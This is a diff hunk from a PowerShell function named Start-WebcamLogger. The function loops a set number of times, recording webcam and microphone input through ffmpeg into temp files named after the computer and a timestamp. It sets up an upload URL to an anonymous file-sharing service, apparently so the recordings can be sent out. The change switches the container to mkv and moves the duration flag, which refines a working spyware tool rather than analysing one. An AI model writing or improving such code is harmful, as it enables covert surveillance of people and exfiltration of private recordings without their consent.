@@ -57,16 +57,15 @@ function Start-WebcamLogger{
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
-        $path = "$env:temp\camlog-$env:computername-$time.mp4";
+        $path = "$env:temp\camlog-$env:computername-$time.mkv";
         $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f dshow",
             "-s 1280x720",
             "-r 30",
-            "-vcodec hs64",
-            "-t $RecordTime",
             "-rtbufsize 1024M",
             "-i video=`"$cam`":audio=`"$mic`"", 
+            "-t $RecordTime",
             "-y",
             "$path"
         );
